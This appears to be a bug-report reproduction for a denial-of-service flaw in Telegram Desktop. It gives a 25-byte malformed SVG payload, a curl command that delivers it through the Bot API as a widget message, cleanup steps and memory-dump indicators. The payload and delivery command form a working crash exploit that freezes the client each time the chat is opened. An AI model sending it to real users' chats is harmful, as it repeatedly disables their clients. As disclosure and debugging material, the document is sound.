# Reproduction

Only test on accounts, devices and bots you own. The trigger freezes the client; the
message stays in the chat and re-triggers on every open until it is deleted.

## Payload

```
<svg><path d="M0 0z4"/></svg>
```

29 bytes. Absolute minimum:

```
<svg><path d="z4"/></svg>
```

25 bytes. Control payload that must **not** freeze the client:

```
<svg><path d="M0 0z"/></svg>
```

## Steps

1. Create a private chat with a bot you control.
2. Send the payload as a widget message, `allow_queries: false`:

   ```bash
   curl -sS "https://api.telegram.org/bot$BOT_TOKEN/sendWidget" \
     -d chat_id=<YOUR_CHAT_ID> \
     -d allow_queries=false \
     --data-urlencode 'widget=<svg><path d="M0 0z4"/></svg>'
   ```

   The endpoint accepts it: HTTP 200, `ok: true`.

3. Open the chat in Telegram Desktop 7.4.1 x64 on Windows.
4. The widget area renders empty, then the window stops responding within a second.
   Windows shows "Telegram Desktop is not responding".
5. Kill the process. Restart, open the chat again — it freezes again.

## Cleanup

The message can be deleted without opening the chat:

```bash
curl -sS "https://api.telegram.org/bot$BOT_TOKEN/deleteMessage" \
  -d chat_id=<YOUR_CHAT_ID> -d message_id=<MESSAGE_ID>
```

Verify that it is gone:

```bash
curl -sS "https://api.telegram.org/bot$BOT_TOKEN/editMessageText" \
  -d chat_id=<YOUR_CHAT_ID> -d message_id=<MESSAGE_ID> -d text=probe
# -> 400 Bad Request: message to edit not found
```

## What to look for in a dump

* one thread burning CPU while the rest are parked;
* a single multi-hundred-MB region filled with the dword `4`;
* a `std::vector<uint32_t>` whose `end - begin` matches the region;
* a coordinate vector that did not grow.

Reproduction rate on the affected build: 100% (the widget is parsed whenever the chat
is opened).
